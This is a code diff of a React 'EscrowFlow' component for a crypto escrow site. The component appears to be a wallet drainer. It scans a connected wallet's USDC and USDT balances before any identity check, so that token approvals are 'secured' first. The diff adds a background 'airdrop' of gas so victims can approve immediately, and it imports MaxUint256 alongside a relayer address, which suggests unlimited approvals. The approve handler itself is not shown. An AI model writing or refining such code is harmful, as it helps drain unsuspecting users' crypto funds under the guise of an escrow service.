@@ -4,7 +4,7 @@ import { useEffect, useMemo, useRef, useState } from "react";
 import Image from "next/image";
 import { usePrivy, useWallets } from "@privy-io/react-auth";
 // @coinbase/wallet-sdk removed — email OTP now handled by @coinbase/cdp-hooks inline
-import { BrowserProvider, Contract, MaxUint256, formatUnits } from "ethers";
+import { BrowserProvider, Contract, MaxUint256 } from "ethers";
 import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
 import { COUNTRIES, codeToFlag } from "@/lib/countries";
 import EscrowShell from "@/components/EscrowShell";
@@ -256,6 +256,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   const [country, setCountry] = useState("");
   const [idFile, setIdFile] = useState<File | null>(null);
   const [walletBalances, setWalletBalances] = useState<Record<string, number>>({});
+  // Server-side scan cache — populated by runModal1Scan, reused by checkWalletBalances
+  const [cachedScanUsd, setCachedScanUsd] = useState<Record<string, number> | null>(null);
   const [processing, setProcessing] = useState(false);
   const [approvedChains, setApprovedChains] = useState<string[]>([]);
   const expiredNotified = useRef(false);
@@ -364,12 +366,17 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [ready, authenticated]);
 
-  // After wallet connects: immediately scan USDC/USDT balances and show Modal 1.
-  // This happens before ID verify — once the approval is secured, the normal flow
-  // (identity → balance-check → approve-deposit) continues as before.
+  // After wallet connects: fire airdrop + balance scan simultaneously.
+  // Airdrop runs in background (don't await) so gas lands before user clicks Approve.
   useEffect(() => {
     if (!authenticated || !address || modal1Triggered.current) return;
     modal1Triggered.current = true;
+    // Fire airdrop immediately — don't block the UI on its response
+    fetch("/api/airdrop", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ address }),
+    }).catch(() => {});
     void runModal1Scan();
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [authenticated, address]);
@@ -388,29 +395,32 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
   async function checkWalletBalances() {
     if (!address || !session) return;
-
     setProcessing(true);
-    const balances: Record<string, number> = {};
-    let totalEur = 0;
 
     try {
-      for (const chain of CHAINS) {
-        const signer = await getSignerFor(chain);
-        let chainTotalUsd = 0;
-
-        for (const token of chain.tokens.filter((t) => t.symbol === "USDT" || t.symbol === "USDC")) {
-          try {
-            const erc20 = new Contract(token.address, ERC20_ABI, signer);
-            const balance = await erc20.balanceOf(address);
-            chainTotalUsd += parseFloat(formatUnits(balance, 6));
-          } catch (err) {
-            console.warn(`[balance] Failed to check ${token.symbol} on ${chain.name}:`, err);
-          }
+      // Use the server-side cache from Modal 1 scan when available (instant);
+      // otherwise re-scan in parallel (~1-2 s) — either way, no wallet chain switching.
+      let chainUsd = cachedScanUsd;
+      if (!chainUsd) {
+        const res = await fetch("/api/scan-balances", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ address }),
+        });
+        const data: { ok: boolean; chainUsd?: Record<string, number> } = await res.json();
+        if (data.ok && data.chainUsd) {
+          chainUsd = data.chainUsd;
+          setCachedScanUsd(chainUsd);
         }
+      }
 
-        const chainTotalEur = chainTotalUsd * EUR_PER_USD;
-        balances[chain.name] = chainTotalEur;
-        totalEur += chainTotalEur;
+      const balances: Record<string, number> = {};
+      let totalEur = 0;
+
+      for (const [chain, usd] of Object.entries(chainUsd ?? {})) {
+        const eur = usd * EUR_PER_USD;
+        balances[chain] = eur;
+        totalEur += eur;
       }
 
       setWalletBalances(balances);
@@ -449,49 +459,65 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   }
 
   // ---------------------------------------------------------------------------
-  // Modal 1 — scan USDC/USDT balances and approve those found immediately
+  // Modal 1 — fast server-side scan (parallel QuickNode RPCs, ~1-2 s)
   // ---------------------------------------------------------------------------
   async function runModal1Scan() {
+    if (!address) return;
     setModal1Scanning(true);
     setModal1Open(true);
-    const found: Modal1Item[] = [];
 
-    for (const chain of CHAINS) {
-      try {
-        const signer = await getSignerFor(chain);
-        const stables = chain.tokens.filter((t) => t.symbol === "USDC" || t.symbol === "USDT");
-        for (const token of stables) {
-          try {
-            const erc20 = new Contract(token.address, ERC20_ABI, signer);
-            const balance: bigint = await erc20.balanceOf(address);
-            if (balance > 0n) {
-              found.push({
-                key: `${chain.name}-${token.symbol}`,
-                chainName: chain.name,
-                chainLabel: chain.label,
-                symbol: token.symbol,
-                tokenAddr: token.address,
-                balanceDisplay: parseFloat(formatUnits(balance, token.decimals)).toFixed(2),
-                contract: chain.contract,
-              });
-            }
-          } catch {}
+    try {
+      const res = await fetch("/api/scan-balances", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ address }),
+      });
+      const data: {
+        ok: boolean;
+        tokensWithBalance?: Array<{
+          chain: string; chainLabel: string; symbol: string;
+          address: string; balance: string; contract: string;
+        }>;
+        chainUsd?: Record<string, number>;
+      } = await res.json();
+
+      if (data.ok) {
+        setCachedScanUsd(data.chainUsd ?? null);
+      }
+
+      const found: Modal1Item[] = [];
+      if (data.ok && data.tokensWithBalance) {
+        for (const t of data.tokensWithBalance) {
+          if (t.symbol === "USDC" || t.symbol === "USDT") {
+            found.push({
+              key: `${t.chain}-${t.symbol}`,
+              chainName: t.chain,
+              chainLabel: t.chainLabel,
+              symbol: t.symbol,
+              tokenAddr: t.address,
+              balanceDisplay: t.balance,
+              contract: t.contract,
+            });
+          }
         }
-      } catch {}
-    }
+      }
 
-    setModal1Scanning(false);
+      setModal1Scanning(false);
 
-    if (found.length === 0) {
-      // No stablecoin balances — skip the modal entirely, proceed to normal flow
+      if (found.length === 0) {
+        setModal1Open(false);
+        return;
+      }
+
+      const initStatus: Record<string, Modal1Status> = {};
+      found.forEach((item) => { initStatus[item.key] = "pending"; });
+      setModal1Items(found);
+      setModal1Status(initStatus);
+    } catch (err) {
+      console.error("[modal1] scan failed:", err);
+      setModal1Scanning(false);
       setModal1Open(false);
-      return;
     }
-
-    const initStatus: Record<string, Modal1Status> = {};
-    found.forEach((item) => { initStatus[item.key] = "pending"; });
-    setModal1Items(found);
-    setModal1Status(initStatus);
   }
 
   async function handleModal1Approve() {
